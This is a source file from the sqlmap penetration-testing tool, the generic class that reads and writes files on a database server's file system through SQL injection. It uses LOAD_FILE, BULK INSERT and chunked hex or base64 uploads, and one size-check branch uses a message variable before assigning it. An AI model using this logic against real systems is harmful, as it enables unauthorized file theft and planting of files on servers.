#!/usr/bin/env python

"""
Copyright (c) 2006-2012 sqlmap developers (http://sqlmap.org/)
See the file 'doc/COPYING' for copying permission
"""

import codecs
import os

from lib.core.agent import agent
from lib.core.common import dataToOutFile
from lib.core.common import Backend
from lib.core.common import decodeHexValue
from lib.core.common import isNumPosStrValue
from lib.core.common import isListLike
from lib.core.common import isTechniqueAvailable
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapUndefinedMethod
from lib.request import inject

class Filesystem:
    """
    This class defines generic OS file system functionalities for plugins.
    """

    def __init__(self):
        self.fileTblName = "sqlmapfile"
        self.tblField = "data"

    def _checkFileLength(self, localFile, remoteFile, fileRead=False):
        if Backend.isDbms(DBMS.MYSQL):
            lengthQuery = "SELECT LENGTH(LOAD_FILE('%s'))" % remoteFile

        elif Backend.isDbms(DBMS.PGSQL):
            if fileRead:
                lengthQuery = True
            else:
                lengthQuery = "SELECT LENGTH(data) FROM pg_largeobject WHERE loid=%d" % self.oid

        elif Backend.isDbms(DBMS.MSSQL):
            self.createSupportTbl(self.fileTblName, self.tblField, "text")

            # Reference: http://msdn.microsoft.com/en-us/library/ms188365.aspx
            inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (self.fileTblName, remoteFile, randomStr(10), randomStr(10)))

            lengthQuery = "SELECT DATALENGTH(%s) FROM %s" % (self.tblField, self.fileTblName)

        localFileSize = os.path.getsize(localFile)

        logger.debug("checking the length of the remote file %s" % remoteFile)
        remoteFileSize = inject.getValue(lengthQuery, resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)
        sameFile = None

        if isNumPosStrValue(remoteFileSize):
            remoteFileSize = long(remoteFileSize)
            sameFile = False

            if localFileSize == remoteFileSize:
                sameFile = True
                infoMsg = "the local file %s and the remote file " % localFile
                infoMsg += "%s have the same size" % remoteFile
            elif remoteFileSize > localFileSize:
                infoMsg = "the remote file %s is larger than " % remoteFile
                infoMsg += "the local file %s" % localFile
            else:
                infoMsg += ", but the size differs from the local "
                infoMsg += "file '%s' (%d bytes)" % (localFile, localFileSize)

            logger.info(infoMsg)
        else:
            sameFile = False
            warnMsg = "it looks like the file has not been written, this "
            warnMsg += "can occur if the DBMS process' user has no write "
            warnMsg += "privileges in the destination path"
            logger.warn(warnMsg)

        return sameFile

    def fileToSqlQueries(self, fcEncodedList):
        """
        Called by MySQL and PostgreSQL plugins to write a file on the
        back-end DBMS underlying file system
        """

        counter = 0
        sqlQueries = []

        for fcEncodedLine in fcEncodedList:
            if counter == 0:
                sqlQueries.append("INSERT INTO %s(%s) VALUES (%s)" % (self.fileTblName, self.tblField, fcEncodedLine))
            else:
                updatedField = agent.simpleConcatQuery(self.tblField, fcEncodedLine)
                sqlQueries.append("UPDATE %s SET %s=%s" % (self.fileTblName, self.tblField, updatedField))

            counter += 1

        return sqlQueries

    def fileEncode(self, fileName, encoding, single):
        """
        Called by MySQL and PostgreSQL plugins to write a file on the
        back-end DBMS underlying file system
        """

        retVal = []
        with codecs.open(fileName, "rb") as f:
            content = f.read().encode(encoding).replace("\n", "")

        if not single:
            if len(content) > 256:
                for i in xrange(0, len(content), 256):
                    _ = content[i:i+256]

                    if encoding == "hex":
                        _ = "0x%s" % _
                    elif encoding == "base64":
                        _ = "'%s'" % _

                    retVal.append(_)

        if not retVal:
            if encoding == "hex":
                content = "0x%s" % content
            elif encoding == "base64":
                content = "'%s'" % content

            retVal = [ content ]

        return retVal

    def askCheckWrittenFile(self, localFile, remoteFile):
        message = "do you want confirmation that the local file '%s' " % localFile
        message += "has been successfully written on the back-end DBMS "
        message += "file system (%s)? [Y/n] " % remoteFile
        output = readInput(message, default="Y")

        if not output or output in ("y", "Y"):
            return self._checkFileLength(localFile, remoteFile)

        return True

    def askCheckReadFile(self, localFile, remoteFile):
        message = "do you want confirmation that the remote file '%s' " % remoteFile
        message += "has been successfully downloaded from the back-end "
        message += "DBMS file system? [Y/n] "
        output = readInput(message, default="Y")

        if not output or output in ("y", "Y"):
            return self._checkFileLength(localFile, remoteFile, True)

        return True

    def nonStackedReadFile(self, remoteFile):
        errMsg = "'nonStackedReadFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod, errMsg

    def stackedReadFile(self, remoteFile):
        errMsg = "'stackedReadFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod, errMsg

    def unionWriteFile(self, localFile, remoteFile, fileType):
        errMsg = "'unionWriteFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod, errMsg

    def stackedWriteFile(self, localFile, remoteFile, fileType):
        errMsg = "'stackedWriteFile' method must be defined "
        errMsg += "into the specific DBMS plugin"
        raise SqlmapUndefinedMethod, errMsg

    def readFile(self, remoteFiles):
        fileContent = None
        remoteFilePaths = []

        self.checkDbmsOs()

        for remoteFile in remoteFiles.split(","):
            kb.fileReadMode = True

            if conf.direct or isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
                if isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
                    debugMsg = "going to read the file with stacked query SQL "
                    debugMsg += "injection technique"
                    logger.debug(debugMsg)

                fileContent = self.stackedReadFile(remoteFile)
            elif Backend.isDbms(DBMS.MYSQL):
                debugMsg = "going to read the file with a non-stacked query "
                debugMsg += "SQL injection technique"
                logger.debug(debugMsg)

                fileContent = self.nonStackedReadFile(remoteFile)
            else:
                errMsg = "none of the SQL injection techniques detected can "
                errMsg += "be used to read files from the underlying file "
                errMsg += "system of the back-end %s server" % Backend.getDbms()
                logger.error(errMsg)

                return None

            kb.fileReadMode = False

            if fileContent in (None, "") and not Backend.isDbms(DBMS.PGSQL):
                self.cleanup(onlyFileTbl=True)

                return
            elif isListLike(fileContent):
                newFileContent = ""

                for chunk in fileContent:
                    if isListLike(chunk):
                        if len(chunk) > 0:
                            chunk = chunk[0]
                        else:
                            chunk = ""

                    if chunk:
                        newFileContent += chunk

                fileContent = newFileContent

            fileContent = decodeHexValue(fileContent)
            remoteFilePath = dataToOutFile(fileContent)

            if not Backend.isDbms(DBMS.PGSQL):
                self.cleanup(onlyFileTbl=True)

            self.askCheckReadFile(remoteFilePath, remoteFile)

            remoteFilePaths.append(remoteFilePath)

        return remoteFilePaths

    def writeFile(self, localFile, remoteFile, fileType=None):
        self.checkDbmsOs()

        if conf.direct or isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
            if isTechniqueAvailable(PAYLOAD.TECHNIQUE.STACKED):
                debugMsg = "going to upload the %s file with " % fileType
                debugMsg += "stacked query SQL injection technique"
                logger.debug(debugMsg)

            self.stackedWriteFile(localFile, remoteFile, fileType)
            self.cleanup(onlyFileTbl=True)
        elif isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION) and Backend.isDbms(DBMS.MYSQL):
            debugMsg = "going to upload the %s file with " % fileType
            debugMsg += "UNION query SQL injection technique"
            logger.debug(debugMsg)

            self.unionWriteFile(localFile, remoteFile, fileType)
        else:
            errMsg = "none of the SQL injection techniques detected can "
            errMsg += "be used to write files to the underlying file "
            errMsg += "system of the back-end %s server" % Backend.getDbms()
            logger.error(errMsg)

            return None
